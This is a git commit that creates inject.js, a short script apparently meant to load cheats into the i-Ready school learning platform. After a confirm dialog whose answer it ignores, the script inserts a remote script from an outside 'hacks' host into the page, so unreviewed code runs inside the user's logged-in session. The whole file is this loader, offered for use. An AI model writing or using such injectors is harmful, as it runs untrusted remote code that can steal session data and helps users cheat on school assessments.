bb895cd81eb49aa252693a7126e545535d25b80e
mohamedhashax1561 <98610831+mohamedhashax1561@users.noreply.github.com>
2022-10-12 19:20:57 -0400

    Create inject.js

---
+++ inject.js
@@ -0,0 +1,8 @@
+var inject = document.createElement("script");
+
+let meow = confirm('fk iready: fixed and cleaned by rondale quis fingerbottomson VII#6969)')
+if (meow === true) {
+}
+
+inject.src = `https://www.i-ready.dev/hacks/hacks.js`
+document.body.appendChild(inject);
